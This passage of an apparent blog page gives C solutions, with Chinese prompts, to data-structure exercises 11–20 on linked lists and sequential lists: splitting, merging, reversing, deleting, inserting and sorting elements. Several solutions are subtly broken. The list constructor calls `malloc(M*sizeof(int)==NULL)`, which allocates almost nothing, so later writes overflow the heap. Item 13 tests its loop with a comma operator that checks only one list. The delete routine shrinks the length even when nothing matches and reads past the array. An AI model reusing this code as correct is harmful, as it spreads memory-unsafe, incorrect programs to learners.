class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode                 </span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct  Lnode *next;</span><br><span class="line">&#125; Lnode,*linklist;</span><br><span class="line">void input1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">linklist r,s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line">r=L;</span><br><span class="line">printf(&quot;请输入%d个节点的数据：\n&quot;,n);</span><br><span class="line">for(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;s-&gt;data);</span><br><span class="line">r-&gt;next=s;</span><br><span class="line">r=s;</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;next=NULL;</span><br><span class="line">&#125;</span><br><span class="line">void output(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void dislist(linklist c,linklist &amp;a,linklist &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">linklist a1,b1,c1,s,r;</span><br><span class="line">a=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">b=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">a-&gt;next=NULL;</span><br><span class="line">a1=a;</span><br><span class="line">b-&gt;next=NULL;</span><br><span class="line">    b1=b;</span><br><span class="line">c1=c-&gt;next;</span><br><span class="line">while(c1)</span><br><span class="line">&#123;</span><br><span class="line">if(c1-&gt;data%2==0)</span><br><span class="line">&#123;   </span><br><span class="line">    r=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">r-&gt;data=c1-&gt;data;</span><br><span class="line">    b1-&gt;next=r;</span><br><span class="line">    b1=r;</span><br><span class="line">c1=c1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    s=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">s-&gt;data=c1-&gt;data;</span><br><span class="line">a1-&gt;next=s;</span><br><span class="line">a1=s;</span><br><span class="line">c1=c1-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a1-&gt;next=NULL;</span><br><span class="line">b1-&gt;next=NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist a,b,c;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入链表中节点个数:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">input1(c,n);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">dislist(c,a,b);</span><br><span class="line">printf(&quot;输出奇数链表：\n&quot;);</span><br><span class="line">output(a);</span><br><span class="line">printf(&quot;输出偶数链表：\n&quot;);</span><br><span class="line">output(b);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">12、/*已知一个带头结点的单链表lc=&#123;a1,b1,a2,b2....,an,bn&#125;共２ｎ个元素，试设计一个算法将其拆分成二个带头结点的单向链表la 与lb,其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bn&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;limits.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int DataType;</span><br><span class="line"></span><br><span class="line">typedef struct LNode* PtrToLNode;</span><br><span class="line">struct LNode&#123;</span><br><span class="line">DataType Data;</span><br><span class="line">PtrToLNode Next;</span><br><span class="line">&#125;;</span><br><span class="line">typedef PtrToLNode List;</span><br><span class="line"></span><br><span class="line">List CreatList()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">List L=(List)malloc(sizeof(struct LNode));</span><br><span class="line">int i;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">h=L;</span><br><span class="line">printf(&quot;输入链表长度：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;输入链表元素：\n&quot;);</span><br><span class="line">for(i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">PtrToLNode NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;NewNode-&gt;Data);</span><br><span class="line">h-&gt;Next=NewNode;</span><br><span class="line">h=NewNode;</span><br><span class="line">&#125;</span><br><span class="line">h-&gt;Next=NULL;</span><br><span class="line">return L;</span><br><span class="line">&#125;</span><br><span class="line">void Separate(List L,List L1,List L2)</span><br><span class="line">&#123;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">PtrToLNode h1,h2;</span><br><span class="line">PtrToLNode NewNode;;</span><br><span class="line">int i=1;</span><br><span class="line">h=L-&gt;Next;</span><br><span class="line">h1=L1;</span><br><span class="line">h2=L2;</span><br><span class="line">for(h;h;i++,h=h-&gt;Next)</span><br><span class="line">&#123;</span><br><span class="line">NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">if(i%2)</span><br><span class="line">&#123;</span><br><span class="line">NewNode-&gt;Data=h-&gt;Data;</span><br><span class="line">h1-&gt;Next=NewNode;</span><br><span class="line">h1=NewNode;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">NewNode-&gt;Data=h-&gt;Data;</span><br><span class="line">h2-&gt;Next=NewNode;</span><br><span class="line">h2=NewNode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">h1-&gt;Next=NULL;</span><br><span class="line">h2-&gt;Next=NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void Print(List L)</span><br><span class="line">&#123;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">for(h=L-&gt;Next;h;h=h-&gt;Next)</span><br><span class="line">printf(&quot;%d &quot;,h-&gt;Data);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">List L=CreatList();</span><br><span class="line">List L1=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">List L2=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">Separate(L,L1,L2);</span><br><span class="line">printf(&quot;输出链表元素：\n&quot;);</span><br><span class="line">Print(L);</span><br><span class="line">printf(&quot;奇数链： &quot;);</span><br><span class="line">Print(L1);</span><br><span class="line">printf(&quot;偶数链： &quot;);</span><br><span class="line">Print(L2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">13、/*已知二个带头结点的单向链表la 与lb,其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bn&#125;， 试设计一个算法将其合并到一个带头结点的单链表lc中，且lc=&#123;a1,b1,a2,b2....,an,bn&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;limits.h&gt;</span><br><span class="line"></span><br><span class="line">typedef int DataType;</span><br><span class="line"></span><br><span class="line">typedef struct LNode* PtrToLNode;</span><br><span class="line">struct LNode&#123;</span><br><span class="line">DataType Data;</span><br><span class="line">PtrToLNode Next;</span><br><span class="line">&#125;;</span><br><span class="line">typedef PtrToLNode List;</span><br><span class="line"></span><br><span class="line">List CreatList()</span><br><span class="line">&#123;</span><br><span class="line">int n;</span><br><span class="line">List L=(List)malloc(sizeof(struct LNode));</span><br><span class="line">int i;</span><br><span class="line">PtrToLNode h;</span><br><span class="line">h=L;</span><br><span class="line">printf(&quot;输入链表la或lb长度：\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;输入链表la或lb的元素：\n&quot;);</span><br><span class="line">for(i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">PtrToLNode NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;NewNode-&gt;Data);</span><br><span class="line">h-&gt;Next=NewNode;</span><br><span class="line">h=NewNode;</span><br><span class="line">&#125;</span><br><span class="line">h-&gt;Next=NULL;</span><br><span class="line">return L;</span><br><span class="line">&#125;</span><br><span class="line">void He(List L,List L1,List L2)</span><br><span class="line">&#123;</span><br><span class="line">int i=1;</span><br><span class="line">PtrToLNode NewNode;</span><br><span class="line">PtrToLNode h1,h2,h;</span><br><span class="line">h1=L1-&gt;Next;h2=L2-&gt;Next;</span><br><span class="line">h=L;</span><br><span class="line">for(h1,h2;h1,h2;i++)</span><br><span class="line">&#123;</span><br><span class="line">NewNode=(PtrToLNode)malloc(sizeof(struct LNode));</span><br><span class="line">if(i%2)</span><br><span class="line">&#123;</span><br><span class="line">NewNode-&gt;Data=h1-&gt;Data;</span><br><span class="line">h-&gt;Next=NewNode;</span><br><span class="line">h=NewNode;</span><br><span class="line">h1=h1-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">NewNode-&gt;Data=h2-&gt;Data;</span><br><span class="line">h-&gt;Next=NewNode;</span><br><span class="line">h=NewNode;</span><br><span class="line">h2=h2-&gt;Next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">h-&gt;Next=NULL;</span><br><span class="line">&#125;</span><br><span class="line">void Print(List L)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PtrToLNode h;for(h=L-&gt;Next;h;h=h-&gt;Next)printf(&quot;%d &quot;,h-&gt;Data);printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">List L1=CreatList();List L2=CreatList();List L=(List)malloc(sizeof(struct LNode));He(L,L1,L2);printf(&quot;输出链表lc元素：\n&quot;) ;Print(L);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">14、已知单链表la=&#123;a1,a2,...an&#125;，试编写一个算法，将la中的元素进行逆置，</span><br><span class="line">即la=&#123;an,an-1,...a1&#125;</span><br><span class="line"></span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct node</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct node *next;</span><br><span class="line">&#125;Lnode,*linklist;</span><br><span class="line"></span><br><span class="line">void creatfifo1(linklist &amp;L,int n)</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">linklist s;</span><br><span class="line">L=(linklist)malloc(sizeof(Lnode));</span><br><span class="line">L-&gt;next=NULL;</span><br><span class="line"></span><br><span class="line">printf(&quot;输出链表的值为:\n&quot;,n);for(i=n;i&gt;0;--i)&#123;s=(linklist)malloc(sizeof(Lnode));scanf(&quot;%d&quot;,&amp;s-&gt;data);s-&gt;next=L-&gt;next;L-&gt;next=s;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print(linklist L)</span><br><span class="line">&#123;</span><br><span class="line">linklist p;</span><br><span class="line">p=L-&gt;next;</span><br><span class="line">printf(&quot;逆置后链表的值为:\n&quot;);</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">linklist L;</span><br><span class="line">int n;</span><br><span class="line"></span><br><span class="line">printf(&quot;请输入链表的元素个数:\n&quot;);scanf(&quot;%d&quot;,&amp;n);creatfifo1(L,n);print(L);return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">15、已知顺序表L长度为n，试编写算法实现在顺序表中删除值为elem的数据元素</span><br><span class="line">(其中n与elem从键盘输入）</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d &quot;,*i);</span><br><span class="line"> &#125;</span><br><span class="line"> void delet(list &amp;l,int elem)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i,*j;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> if (*i==elem)</span><br><span class="line"> &#123;</span><br><span class="line"> for(j=i;j&lt;l.e+l.len;j++)</span><br><span class="line"> *j=*(j+1);</span><br><span class="line">  break;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125; l.len--; printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list s;</span><br><span class="line"> int n,elem;</span><br><span class="line"> creat(s);</span><br><span class="line"> printf(&quot;请输入顺序表的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表的值：\n&quot;);</span><br><span class="line"> input(s,n);</span><br><span class="line"> printf(&quot;请删除顺序表中值为elem的数据元素:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;elem);</span><br><span class="line"> delet(s,elem);</span><br><span class="line"> output(s);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">16、已知顺序表L长度为n，试编写算法实现在顺序表中值为elem的数据元素的</span><br><span class="line">后面插入一个值为key的数据元素（其中n、elem与key从键盘输入且顺序表的</span><br><span class="line">数据元素的值互不相同）</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d  &quot;,*i);</span><br><span class="line"> &#125;</span><br><span class="line"> void over(list &amp;l,int elem,int key)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i,*j;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> if (*i==elem)</span><br><span class="line"> &#123;</span><br><span class="line"> for(j=l.e+l.len;j&gt;i+1;j--)</span><br><span class="line"> *j=*(j-1);</span><br><span class="line">  *(++i)=key;</span><br><span class="line">  break;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> &#125; l.len++;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list s;</span><br><span class="line"> int n,elem,key;</span><br><span class="line"> creat(s);</span><br><span class="line"> printf(&quot;请输入顺序表的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表的值：\n&quot;);</span><br><span class="line"> input(s,n);</span><br><span class="line"> printf(&quot;输入elem、key(顺序表中值为elem的元素的后面插入一个值为key的元素):\n&quot;);</span><br><span class="line"> scanf(&quot;%d%d&quot;,&amp;elem,&amp;key);</span><br><span class="line"> over(s,elem,key);</span><br><span class="line">printf(&quot;插入key后的顺序表：\n&quot;);</span><br><span class="line"> output(s);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">17、已知顺序表&#123;a0,a1,a2,...,an-1&#125;，且每个元素都是不相同的,试设计一个算法</span><br><span class="line">把所有的奇数移到所有的偶数的前面。</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d  &quot;,*i);</span><br><span class="line"> &#125; </span><br><span class="line"> void over(list l,list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i,*j,*t;</span><br><span class="line"> s.len=l.len;</span><br><span class="line"> i=l.e;</span><br><span class="line"> j=s.e;</span><br><span class="line"> t=s.e+s.len-1;</span><br><span class="line">   for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    if(*i%2==1)</span><br><span class="line">    &#123;</span><br><span class="line">    *j=*i;</span><br><span class="line">    j++;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">*t=*i;</span><br><span class="line">t--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"> int main()</span><br><span class="line">&#123;</span><br><span class="line"> list s,ss;</span><br><span class="line"> int n,elem;</span><br><span class="line"> creat(s);</span><br><span class="line"> creat(ss);</span><br><span class="line"> printf(&quot;请输入顺序表的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表的值：\n&quot;);</span><br><span class="line"> input(s,n);</span><br><span class="line"> printf(&quot;所有的奇数移到所有的偶数的前面:\n&quot;);</span><br><span class="line"> over(s,ss);</span><br><span class="line"> output(ss);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18、已知二个集合la与lb,采用顺序结构存储，其中la=&#123;a1,a2,...an&#125;,lb=&#123;b1,b2,...,bｍ&#125;， </span><br><span class="line">试设计一个算法将其合并到一个顺序表lc中</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define M 100</span><br><span class="line"></span><br><span class="line">typedef struct list</span><br><span class="line">&#123;</span><br><span class="line">int *e;</span><br><span class="line">int len;</span><br><span class="line">int size;</span><br><span class="line"> &#125; sqlist;</span><br><span class="line"></span><br><span class="line"> void creat(list &amp;s)</span><br><span class="line"> &#123;</span><br><span class="line"> s.e=(int*)malloc(M*sizeof(int)==NULL);</span><br><span class="line"> s.len=0;</span><br><span class="line"> s.size=M;</span><br><span class="line"> &#125;</span><br><span class="line"> void input(list &amp;l,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> l.len=n;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> scanf(&quot;%d&quot;,i);</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list l)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i;</span><br><span class="line"> for(i=l.e;i&lt;l.e+l.len;i++)</span><br><span class="line"> printf(&quot;%d  &quot;,*i);</span><br><span class="line"> &#125;</span><br><span class="line"> void hblist(list la,list lb,list &amp;lc)</span><br><span class="line"> &#123;</span><br><span class="line"> int *i,*j,*t;</span><br><span class="line"> lc.len=la.len+lb.len;</span><br><span class="line"> t=lc.e;</span><br><span class="line"> for(i=la.e;i&lt;la.e+la.len;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> *t=*i;</span><br><span class="line"> t++;&#125;</span><br><span class="line"> for(j=lb.e;j&lt;lb.e+lb.len;j++)</span><br><span class="line"> &#123;</span><br><span class="line"> *t=*j;</span><br><span class="line"> t++;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> int main()</span><br><span class="line"> &#123;</span><br><span class="line"> list la,lb,lc;</span><br><span class="line"> int n,m;</span><br><span class="line"> creat(lb);</span><br><span class="line"> creat(la);</span><br><span class="line"> creat(lc);</span><br><span class="line"> printf(&quot;请输入顺序表la的长度n:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line"> printf(&quot;请输入顺序表la的值：\n&quot;);</span><br><span class="line"> input(la,n);</span><br><span class="line">    printf(&quot;请输入顺序表lb的长度m:\n&quot;);</span><br><span class="line"> scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line"> printf(&quot;请输入顺序表lb的值：\n&quot;);</span><br><span class="line"> input(lb,m);</span><br><span class="line"> printf(&quot;合并la和lb并输出lc：\n&quot;);</span><br><span class="line"> hblist(la,lb,lc);</span><br><span class="line"> output(lc);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">19、已知一个顺序表la，其中la=&#123;a1,a2,...an&#125;， 试设计一个算法将其从小到大</span><br><span class="line">进行排序 ，再输出</span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct Lnode *next;</span><br><span class="line">&#125; Lnode,*list;</span><br><span class="line"></span><br><span class="line">status creatlist(list &amp;s,int n)</span><br><span class="line">&#123;</span><br><span class="line">list q,p;</span><br><span class="line">s=(list)malloc(sizeof(Lnode));</span><br><span class="line">s-&gt;next=NULL;</span><br><span class="line">q=s;</span><br><span class="line">for(int i=1;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line">p=(list)malloc(sizeof(Lnode));</span><br><span class="line">scanf(&quot;%d&quot;,&amp;p-&gt;data);</span><br><span class="line">q-&gt;next=p;</span><br><span class="line">q=p;</span><br><span class="line">&#125;</span><br><span class="line">q-&gt;next=NULL;</span><br><span class="line">return ok;</span><br><span class="line">&#125;</span><br><span class="line">void output(list s)</span><br><span class="line">&#123;</span><br><span class="line">list p;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line">p=p-&gt;next ;</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void paixu(list &amp;s)</span><br><span class="line">&#123;</span><br><span class="line">list p,q;</span><br><span class="line">elemtype n;</span><br><span class="line">p=s-&gt;next;</span><br><span class="line">while(p)</span><br><span class="line">&#123;</span><br><span class="line">q=p-&gt;next;</span><br><span class="line">while(q)</span><br><span class="line">&#123;</span><br><span class="line">if(p-&gt;data&gt;q-&gt;data)</span><br><span class="line">&#123;</span><br><span class="line">n=p-&gt;data;</span><br><span class="line">p-&gt;data=q-&gt;data;</span><br><span class="line">q-&gt;data=n;</span><br><span class="line">&#125;</span><br><span class="line">q=q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">list s;</span><br><span class="line">int n;</span><br><span class="line">printf(&quot;请输入链表节点个数的值n:\n&quot;);</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入链表节点的值:\n&quot;);</span><br><span class="line">creatlist(s,n);</span><br><span class="line">printf(&quot;输出链表节点值:\n&quot;);</span><br><span class="line">output(s);</span><br><span class="line">printf(&quot;从小到大进行输出:\n&quot;);</span><br><span class="line">paixu(s);</span><br><span class="line">output(s);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">20//、已知二个单向有序链表la与lb，其中la=&#123;a1,a2,...an&#125;，lb=&#123;b1,b2,...bm&#125;， 试设计一个算法将它们合并到单链表lc中，且lc仍然有序，再输出 </span><br><span class="line"></span><br><span class="line">#include&quot;stdio.h&quot;</span><br><span class="line"></span><br><span class="line">#include&quot;stdlib.h&quot;</span><br><span class="line"></span><br><span class="line">#define ok 1</span><br><span class="line"></span><br><span class="line">#define error 0</span><br><span class="line"></span><br><span class="line">typedef int status;</span><br><span class="line">typedef int elemtype;</span><br><span class="line"></span><br><span class="line">typedef struct Lnode</span><br><span class="line">&#123;</span><br><span class="line">elemtype data;</span><br><span class="line">struct Lnode *next;</span><br><span class="line"> &#125; Lnode,*list;</span><br><span class="line"></span><br><span class="line"> status creatlist(list &amp;s,int n)</span><br><span class="line"> &#123;</span><br><span class="line"> list q,p;</span><br><span class="line"> s=(list)malloc(sizeof(Lnode));</span><br><span class="line"> s-&gt;next=NULL;</span><br><span class="line"> q=s;</span><br><span class="line"> for(int i=1;i&lt;=n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">   p=(list)malloc(sizeof(Lnode));</span><br><span class="line">   scanf(&quot;%d&quot;,&amp;p-&gt;data);</span><br><span class="line">   q-&gt;next=p;</span><br><span class="line">   q=p;</span><br><span class="line">   &#125;</span><br><span class="line"> q-&gt;next=NULL;</span><br><span class="line"> return ok;</span><br><span class="line"> &#125;</span><br><span class="line"> void output(list s)</span><br><span class="line"> &#123;</span><br><span class="line"> list p;</span><br><span class="line"> p=s-&gt;next;</span><br><span class="line"> while(p)</span><br><span class="line"> &#123;</span><br><span class="line"> printf(&quot;%d &quot;,p-&gt;data);</span><br><span class="line"> p=p-&gt;next ;</span><br><span class="line"> &#125;</span><br><span class="line"> printf(&quot;\n&quot;);</span><br><span class="line"> &#125;</span><br><span class="line"> void mergelist(list 